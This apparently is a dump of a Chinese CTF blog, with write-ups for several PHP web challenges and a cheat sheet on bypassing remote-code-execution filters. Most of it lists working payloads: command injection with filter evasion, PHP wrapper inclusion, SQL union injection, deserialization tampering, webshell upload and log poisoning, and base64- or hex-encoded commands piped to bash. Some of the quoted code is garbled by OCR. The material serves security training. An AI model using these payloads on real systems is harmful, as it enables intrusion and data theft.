title="ezrce:"></a>ezrce:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;   $cmd = $_GET[&#x27;cmd&#x27;];   if (preg_match(&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;, $cmd)) &#123;     die(&quot;Blocked by security filter!&quot;);   &#125; else &#123;     eval($cmd);   &#125; &#125; else &#123;   highlight_file(__FILE__); </span><br></pre></td></tr></table></figure><p>cmd&#x3D;var_dump(scandir(‘&#x2F;‘));进行读取根目录下面的文件发现flag，</p><p>法1：cmd&#x3D;include$_GET[1];&amp;1&#x3D;pHp:&#x2F;&#x2F;FilTer&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag 然后解码</p><p>法2：?cmd&#x3D;var_dump(file_get_contents($_GET[‘1’]));&amp;1&#x3D;&#x2F;flag</p><p>法3:取反绕过</p><p>法4:cmd&#x3D;passthru(‘cd%09..;cd%09..;uniq%09&#x2F;?l*’);</p><h4 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize:"></a>ezserialize:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php error_reporting(0); class Flag &#123;   private $flag;   public function __construct() &#123;     $this-&gt;flag = file_get_contents(&#x27;/flag&#x27;);   &#125;   public function getFlag() &#123;     return $this-&gt;flag;   &#125;   public function __toString() &#123;     return &quot;You can&#x27;t directly access the flag!&quot;;   &#125; &#125; class User &#123;   public $username;   public $isAdmin = false;   public function __construct($username) &#123;     $this-&gt;username = $username;   &#125;   public function __wakeup() &#123;     if ($this-&gt;isAdmin) &#123;       echo &quot;Welcome, admin! Here&#x27;s your flag: &quot; . (new Flag())-&gt;getFlag();     &#125; else &#123;       echo &quot;Hello, &quot; . htmlspecialchars($this-&gt;username) . &quot;!&quot;;     &#125;   &#125; &#125; if (isset($_GET[&#x27;data&#x27;])) &#123;   $data = $_GET[&#x27;data&#x27;];   $object = unserialize($data);   if ($object instanceof User) &#123;     echo $object;   &#125; else &#123;     echo &quot;Invalid object!&quot;;   &#125; &#125; else &#123;   highlight_file(__FILE__); &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>这个将false改为true然后随便传username就行了；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag &#123;</span><br><span class="line">    private $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $isAdmin = true;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User();</span><br><span class="line">$user-&gt;username =&quot;1&quot;;</span><br><span class="line">echo serialize($user);</span><br></pre></td></tr></table></figure><h4 id="小蓝鲨的临时存储室："><a href="#小蓝鲨的临时存储室：" class="headerlink" title="小蓝鲨的临时存储室："></a>小蓝鲨的临时存储室：</h4><p>这个直接传上去发现&#x2F;flag文件打不开权限不够</p><p>发现&#x2F;down_file.sh:find &#x2F;var&#x2F;www&#x2F;localhost&#x2F;htdocs&#x2F;uploads&#x2F; -type f -name “*.php” -exec rm -f {} ;</p><p>可以改为：&#x2F;flag &gt; &#x2F;tmp&#x2F;1.txt 然后等会就ok了</p><h4 id="小蓝鲨的冒险："><a href="#小蓝鲨的冒险：" class="headerlink" title="小蓝鲨的冒险："></a>小蓝鲨的冒险：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = &quot;isctf2024&quot;; $b = $_GET[&quot;b&quot;]; @parse_str($b); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123;   $num = $_POST[&quot;num&quot;];   if($num == 2024)&#123;     die(&quot;QAQ&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0) == 2024)&#123;     if (isset($_GET[&#x27;which&#x27;]))&#123;       $which = $_GET[&#x27;which&#x27;];       switch ($which)&#123;         case 0:           print(&#x27;QAQ&#x27;);         case 1:         case 2:           require_once $which.&#x27;.php&#x27;;           echo $flag;           break;         default:           echo GWF_HTML::error(&#x27;PHP-0817&#x27;, &#x27;Hacker NoNoNo!&#x27;, false);           break; </span><br></pre></td></tr></table></figure><p>首先是md5绕过：b&#x3D;a[0]&#x3D;240610708</p><p>然后:小数绕过：num&#x3D;2024.1或者8进制</p><p>然后：</p><p>if (isset($_GET[‘which’])){       $which &#x3D; $_GET[‘which’];       switch ($which){         case 0:           print(‘QAQ’);         case 1:         case 2:           require_once $which.’.php’;           echo $flag;           break;         default:           echo GWF_HTML::error(‘PHP-0817’, ‘Hacker NoNoNo!’, false);           break;</p><p>传which&#x3D;flag 正好匹配flag.php就出来了</p><h4 id="小蓝鲨的秘密："><a href="#小蓝鲨的秘密：" class="headerlink" title="小蓝鲨的秘密："></a>小蓝鲨的秘密：</h4><p>打开发现302跳转；直接抓包出来flag</p><h4 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader:"></a>UP!UPloader:</h4><p>文件上传，传上去小马；然后发现include.php会出来文件源码，先读upload.php</p><p>文件上传到 .&#x2F;uploads&#x2F; 目录下，文件名被重命名成 [md5 加密](<a href="https://so.csdn.net/so/search?q=md5">https://so.csdn.net/so/search?q=md5</a> 加密&amp;spm&#x3D;1001.2101.3001.7020)+后缀，按照逻辑访问</p><p>然后蚁剑连接就行了</p><p>发现找不到这里可以在网站上面执行:</p><p>cmd&#x3D;system(‘env’);</p><p>cmd&#x3D;phpinfo();都可以找到</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>emojictfweb</title>
      <link href="/2025/03/16/emojictfweb/"/>
      <url>/2025/03/16/emojictfweb/</url>
      
        <content type="html"><![CDATA[<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE:"></a>RCE:</h3><p>发现f12不能使用，没事，张师傅给我说ctrl+shift+i就可以了，ok.试了试发现没有有用的东西，dirsearch扫描一下发现robots.txt</p><p>然后发现 &#x2F;<a href="mailto:&#102;&#108;&#x40;&#103;&#46;&#112;&#x68;&#x70;">fl@g.php</a>,查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;emo&#x27;]))&#123;   $emo = $_GET[&#x27;emo&#x27;];  if(!preg_match(&quot;/\;|\&quot;|\*| |[b-h]|[m-r]|\\$|\&#123;|\&#125;|\^|\&gt;/i&quot;,$emo))&#123;    system($emo);  &#125;  else&#123;    echo &quot;Again&quot;;    &#125;&#125;else&#123;  echo &quot;Try&quot;;&#125;</span><br></pre></td></tr></table></figure><p>先进行ls查看，发现flag.txt，然后emo&#x3D;tail%09??a?.txt进行查看</p><h3 id="http"><a href="#http" class="headerlink" title="http:"></a>http:</h3><h1 id="你的User-Agent必须被服务器识别为EMOJI-CTF-User-Agent-v1-0-只有使用正确的HTTP方法才能获取flag，不同的方法会得到不同的提示。-需要提供正确的自定义头部EMOJI-CTF-Auth且其值为’Passw0rd-’。-全部完成你就能获得flag"><a href="#你的User-Agent必须被服务器识别为EMOJI-CTF-User-Agent-v1-0-只有使用正确的HTTP方法才能获取flag，不同的方法会得到不同的提示。-需要提供正确的自定义头部EMOJI-CTF-Auth且其值为’Passw0rd-’。-全部完成你就能获得flag" class="headerlink" title="你的User-Agent必须被服务器识别为EMOJI_CTF_User_Agent_v1.0  只有使用正确的HTTP方法才能获取flag，不同的方法会得到不同的提示。 需要提供正确的自定义头部EMOJI-CTF-Auth且其值为’Passw0rd!’。 全部完成你就能获得flag!!!"></a>你的User-Agent必须被服务器识别为EMOJI_CTF_User_Agent_v1.0  只有使用正确的HTTP方法才能获取flag，不同的方法会得到不同的提示。 需要提供正确的自定义头部EMOJI-CTF-Auth且其值为’Passw0rd!’。 全部完成你就能获得flag!!!</h1><p>在bp上面改然后在http方法上面进行爆破测试是什么方法，发现是PUT方法，然后访问fl1l1l1l1ag.php</p><h3 id="e4-sql"><a href="#e4-sql" class="headerlink" title="e4_sql:"></a>e4_sql:</h3><p>进行访问发现1”时候报错说明是字符形注入</p><p>1” order by 2#的时候和 3和4的时候不一样说明有俩列</p><p>-1” union select 1,2#发现2是回显位置</p><p>然后他没有过滤，直接注就行了</p><p>-1” union select 1,database()#<br>-1” union select 1,(select group_concat(username,password) from information)#</p><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web:"></a>easy_web:</h3><p>欢迎打开这个题目!</p><p>但是你的访问被拒绝了，因为我们采用了和知乎一样的反爬虫策略，而你的访问被认为是违规的爬虫了。</p><p>根据提示： User-Agent:Baiduspider</p><p>然后：欢迎来自垃圾百度的臭虫子！但是你爬不到什么了，因为本网站现在仅允许来自CloudFlare CDN的流量</p><p>那么CloudFlareCDN是什么，要特地提出来呢，不知道就去搜，Cloudflare HTTP 标头(<a href="https://developers.cloudflare.com/fundamentals/reference/http-headers/">Cloudflare HTTP 标头 ·Cloudflare 基础知识文档</a>)</p><p>然后就随便尝试了一下</p><p>CF-Connecting-IP:1<br>CF-IPCountry:1</p><p>发现好吧，你来自cloudflare CDN了，但是为了安全，后面的机密内容只能通过洋葱访问（我是怎么知道你是否来自洋葱的呢？这也是CF悄悄告诉我的呀）!</p><p>然后去查了查:</p><p>CF-Connecting-IP:1<br>CF-IPCountry:T1</p><p>OK完事了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SHOWRCE</title>
      <link href="/2025/03/05/SHOWRCE/"/>
      <url>/2025/03/05/SHOWRCE/</url>
      
        <content type="html"><![CDATA[<p>SHOWRCE</p><p>接下来开始我们的RCE刷题SHOW</p><p>29：</p><p>if(isset(<br>$_GET[‘c’]));if(!preg_match(“&#x2F;flag&#x2F;i”,$c)){eval($c);<br>}else{<br>highlight file( FILE );</p><p>先看代码分析出来这个是命令执行，让我们get传参c,然后过滤了flag和他的大小写</p><p>那么payload就出来了：c&#x3D;system(‘tac fl*.php’);(也可以使用其他的查看符)</p><p>其他：c&#x3D;system(‘tac fl””ag.php’);c&#x3D;system(‘tac fl&#96;&#96;ag.php’);c&#x3D;system(‘ta\c fl\ag.php’);等等</p><p>30：</p><p>if(isset($_GET[‘c’])){8c &#x3D; S GETL’c’]:if(!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c)){eval($c):<br>}else{<br>highlight_file( FILE);</p><p>和上面的差不多，就是过滤的多了</p><p>payload:</p><p>?c&#x3D;passthru(“tac fla*”);</p><p>?c&#x3D;echo<code>tac fla*</code>;</p><p>?c&#x3D;$a&#x3D;sys;$b&#x3D;tem;$c&#x3D;$a.$b;$c(“tac fla*”);</p><p>?c&#x3D;echo shell_exec(“tac fla*”);</p><p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“tac flag.php”);</p><p>echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;(show答案)</p><p>31：</p><p>多过滤了cat sort 这个怎么越来越多了，可以进行传参：c&#x3D;eval($_GET[a]);&amp;a&#x3D;system(‘cat flag.php’);也可以使用passthru(要注意过滤了空格)</p><p>32：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure><p>这个不知道为什么不可以用passthru做，不过没关系，可以使用伪协议做，但是首先要先传参：</p><p>palyoad:</p><p>?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?></p><p>上面的可以使用到36，不过要注意一些过滤，比如空格什么的</p><p>37：</p><p>if(isset($_GET[‘c’])){   $c &#x3D; $_GET[‘c’];   if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){     include($c);     echo $flag;     } </p><p>使用选择使用data:[?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><p>或者传小🐎：</p><p>?c&#x3D;include$_GET[a]?%3E&amp;a&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br> &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p><p>然后一直到39关了上面的都大差不差</p><p>40：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)</span><br></pre></td></tr></table></figure><p>这个一下子给我弄不会了，</p><p>只能看wp做了：</p><p>法一</p><p>c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);</p><p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p><p>法二</p><p>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</p><p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p><p>pos():输出数组第一个元素，不改变指针；</p><p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p><p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p><p>array_reverse():数组逆置</p><p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p><p>show_source():查看源码</p><p>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</p><p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p>提示：该函数不会移动数组内部指针。</p><p>相关的方法：</p><p>current()返回数组中的当前元素的值。</p><p>end()将内部指针指向数组中的最后一个元素，并输出。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>prev()将内部指针指向数组中的上一个元素，并输出。</p><p>reset()将内部指针指向数组中的第一个元素，并输出。</p><p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p><p>然后41跑yu师傅脚本就ok了</p><p>42：</p><p>终于简单了；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c=$_GET[&#x27;c&#x27;];   system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>这行代码执行一个系统命令，该命令由变量 $c 的值指定。&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 是一个 shell  重定向操作，意味着命令的标准输出（stdout）和标准错误（stderr）都被重定向到  &#x2F;dev&#x2F;null，即被丢弃，（个人理解是内容注释注释）用户不会看到任何输出结果 所以直接&#x2F;c&#x3D;cat flag.php||%0a使用管道符进行绕过让他执行前面的</p><p>43：</p><p>比前面多过滤了cat、；，那就利用tac，uniq,less,more,strings,nl命令来打印，“||”分割</p><p>或者使用重定向：nl%20flag.php| tee 1.txt然后访问1.txt</p><p>44呢和43差不多,就多了一个flag,可以?l*.php</p><p>45(多了cat):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;     system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); </span><br></pre></td></tr></table></figure><p>palyad:c&#x3D;uniq${IFS}?l*.php||</p><p>46-53:</p><p>都差不多，可以多记点替代cat的和system以及空格的</p><p>54：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>过滤 了很多命令。 中间这些个很多的星号的内容，其实 是说，含有 cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst, 凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。 只能把全路径写出来，如&#x2F;bin&#x2F;ca?,与&#x2F;bin&#x2F;ca?匹配的，只有&#x2F;bin&#x2F;cat命令，这样就用到了cat 命令了。</p><p>于是，有了payload</p><p>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}????.???   然后   查看源码</p><p>55:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>由于过滤了字母，但没有过滤数字可以考虑数字编码：$’\164\141\143’ $’\146\154\141\147\56\160\150\160’</p><p>也可以使用通配符?来进行代替</p><p>?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p><p>替换后变成</p><p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p><p>56+57：这个的话没看明白</p><p>58-65：</p><p>进行post传c,并且eval($c)</p><p>这里嘛，要引入新的函数：show_source,highlight_file;这两个都是对文件进行语法高亮显示</p><p>那么palyad就出来了：c&#x3D;show_source(‘flag.php’);&#x2F;highlight_file(‘flag.php’);</p><p>或者可以利用文件包含写：c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>66-67:</p><p>这个呢引入一个新的东西：print_r(scandir(“&#x2F;“));(print_r或者也可以换成var_dump&#x2F;var_export)和前面的一样不过在本目录下面没有flag.php&#x2F;txt,那个新的东西是查看指定的目录，先返回根目录，然后就发现根目录下面存在着flag.txt，那个就可以show_source(“&#x2F;flag.txt”);或者另一个；</p><p>68-70:</p><p>这一关禁用了highlight_file。依然可以使用上一关的var_dump结合scandir来显示根目录的文件列表。<br> c&#x3D;var_dump(scandir(‘&#x2F;‘));之后show_source和highlight_file都用不了,试试include和require即可。</p><p>71：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>这个的话，查看源代码，可以看到他将数字和字母换成？了，那个可以利用缓冲区用exit();结束</p><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>然后的话就是使用c&#x3D;var_export进行扫描文件根目录：c&#x3D;var_export(scandir(“&#x2F;“));exit;再c&#x3D;include(“&#x2F;flag.txt”);exit();</p><p>剩下的以后再说，有点不会了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2025/03/02/RCE/"/>
      <url>/2025/03/02/RCE/</url>
      
        <content type="html"><![CDATA[<p>RCE:</p><p>1.简述：</p><p>在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时，就产生了RCE漏洞。</p><p>危害：可以让用户（通常是系统管理员或普通用户）执行任意系统命令的漏洞。这种漏洞通常存在于某些程序或脚本中，允许输入参数被编码并传递给可执行文件。</p><p> 比如：如果应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><p>2.分类：命令执行和代码执行</p><p>3.常见函数：</p><p> (1)命令执行函数：</p><p>system()：能将字符串作为OS命令执行，且返回命令执行结果；</p><p>exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</p><p>shell_exec()：能将字符串作为OS命令执行</p><p>passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</p><p>popen()：打开进程文件指针</p><p>proc_open()：与popen()类似</p><p>pcntl_exec()：在当前进程空间执行指定程序；</p><p>反引号<code>：反引号</code>内的字符串会被解析为OS命令；</p><p>补充：OS命令执行是指将用户的文本命令通过操作系统转化为二进制指令并执行的过程</p><p>(2)代码执行函数：</p><p>eval()：将字符串作为php代码执行；</p><p>assert()：将字符串作为php代码执行；</p><p>preg_replace()：正则匹配替换字符串；</p><p>create_function()：主要创建匿名函数；</p><p>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</p><p>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p><p>可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；</p><p>4.常见绕过：</p><p>(1)管道符绕过：</p><p>；：即；前后都执行</p><p>&amp;：即&amp;前后都执行</p><p>&amp;&amp;：即如果&amp;&amp;前为真才执行&amp;&amp;后面的，不然只执行&amp;&amp;前面的</p><p>| ：即显示|后面的执行结果</p><p>||：||前面为假时才执行||后面的，否则只执行||前面的</p><p>(2)空格过滤：</p><p>空格可以替换成：</p><p>&lt;  &lt;&gt;  %20(即space) %09(即TAB)  $IFS$9  ${IFS}  $IFS  {}</p><p>(3)反斜杠：</p><p>如cat、ls被过滤，使用\绕过：<br>c\at &#x2F;flag<br>l\s &#x2F;</p><p>(4)取反绕过：</p><p>&#x2F;&#x2F;取反传参<br>&lt;?php</p><p>$a &#x3D; “system”;<br>$b &#x3D; “cat &#x2F;flag”;</p><p>$c &#x3D; urlencode(<del>$a);<br>$d &#x3D; urlencode(</del>$b);</p><p>&#x2F;&#x2F;输出得到取反传参内容<br>echo “?cmd&#x3D;(<del>“.$c.”)(</del>“.$d.”);”<br>?&gt;</p><p>(5)异或绕过:</p><p>这里推荐yu师傅的脚本</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p>(6)黑名单绕过：</p><p>&#x2F;&#x2F;变量拼接，如flag被过滤<br>将：<br>cat &#x2F;flag<br>替换为：<br>b&#x3D;ag;cat &#x2F;fl$b</p><p>&#x2F;&#x2F;读取根目录<br>eval(var_dump(scandir(‘&#x2F;‘););<br>&#x2F;&#x2F;读flag<br>eval(var_dump(file_get_contents($_POST[‘a’])););&amp;a&#x3D;&#x2F;flag</p><p>&#x2F;&#x2F;等效于打开ls目录下的文件<br>cat <code>ls</code></p><p>&#x2F;&#x2F;<em>被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线</em><br>N[S.S等效于N_S.S<br>php需要接收e_v.a.l参数,给e[v.a.l传参即可</p><p>&#x2F;&#x2F;php标签绕过<br>?&gt;<?= phpinfo(); ?></p><p>(7)base和hexo编码绕过：</p><p>&#x2F;&#x2F;base64编码绕过,编码cat &#x2F;flag，反引号、| bash、$()用于执行系统命令<br><code>echo Y2F0IC9mbGFn | base64 -d</code><br>echo Y2F0IC9mbGFn | base64 -d | bash<br>$(echo Y2F0IC9mbGFn | base64 -d)</p><p>&#x2F;&#x2F;hex编码绕过，编码cat &#x2F;flag,| bash用于执行系统命令<br>echo ‘636174202f666c6167’ | xxd -r -p | bash</p><p>&#x2F;&#x2F;shellcode编码<br>&#x2F;&#x2F;十六进制编码</p><p>(8)正则匹配绕过：</p><p>&#x2F;&#x2F;如flag被过滤<br>cat &#x2F;f???<br>cat &#x2F;fl*<br>cat &#x2F;f[a-z]{3}</p><p>cat &#x2F;?l*</p><p>(9)引号绕过：</p><p>&#x2F;&#x2F;如cat、ls被过滤*</p><p>ca””t &#x2F;flag</p><p>l’s’ &#x2F;</p><p>(10)cat替换命令：</p><p>tac与cat相反，按行反向输出<br>more按页显示，用于文件内容较多且不能滚动屏幕时查看文件<br>less与more类似<br>tail查看文件末几行<br>head查看文件首几行<br>nl在cat查看文件的基础上显示行号<br>od以二进制方式读文件，od -A d -c &#x2F;flag转人可读字符<br>xxd以二进制方式读文件，同时有可读字符显示<br>sort排序文件<br>uniq报告或删除文件的重复行<br>file -f报错文件内容<br>grep过滤查找字符串，grep flag &#x2F;flag</p><p>strings(也是)</p><p>(11)无回显绕过：</p><p>&#x2F;&#x2F;无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可<br>ls &#x2F; | tee 1.txt<br>cat &#x2F;flag | tee 2.txt<br>&#x2F;&#x2F;eval()无输出<br>eval(print<code>c\at /flag</code>;)</p><p>(12)</p><p>无参数RCE</p><p>​    利用getallheaders()、get_defined_vars()、session_id等；</p><p>无字母数字RCE</p><p>​    异或、取反、自增、临时文件上传；</p><p>(14)取反绕过：</p><p>&#x2F;&#x2F;取反传参<br>&lt;?php</p><p>$a &#x3D; “system”;<br>$b &#x3D; “cat &#x2F;flag”;</p><p>$c &#x3D; urlencode(<del>$a);<br>$d &#x3D; urlencode(</del>$b);</p><p>&#x2F;&#x2F;输出得到取反传参内容<br>echo “?cmd&#x3D;(<del>“.$c.”)(</del>“.$d.”);”<br>?&gt;</p><p>(15)长度限制：</p><p>touch “ag”</p><p>touch “fl\“</p><p>touch “t \“</p><p>touch “ca\“</p><p>ls -t</p><p>-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</p><p>ls -t &gt; shell</p><p>sh shell(读取flag)</p><p>空格\ ： 这个其实是换行。<br>ls -t ：按照时间将文本排序输出<br>ls -t &gt; shell：将ls -t的输出储存到shell文件中<br>我们首先是用touch命令创建了几个文件，但是他们的文件名是我们的主要。我们使用两个\的原因在于，第一个\用于将后面的\变成字符串，第二个\是用来将后面的文本转换为字符串，以便用于后面的测试。</p><p>补充：</p><p>关于有一些全是报错的；就比如使用var_export(scandir(“&#x2F;“));扫描根目录文件结果发现全是？！什么的；就是全给你替换了，我们可以结合 exit() 函数执行php代码让后面的匹配缓冲区不执行直接退出</p><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>使用 glob:&#x2F;&#x2F; 伪协议绕过 open_basedir，读取根目录下的文件，payload：</p><p>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?>或者c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}exit(0);</p><p>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;getFilename().” “);} exit(0);</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/02/18/hello-world/"/>
      <url>/2025/02/18/hello-world/</url>
      
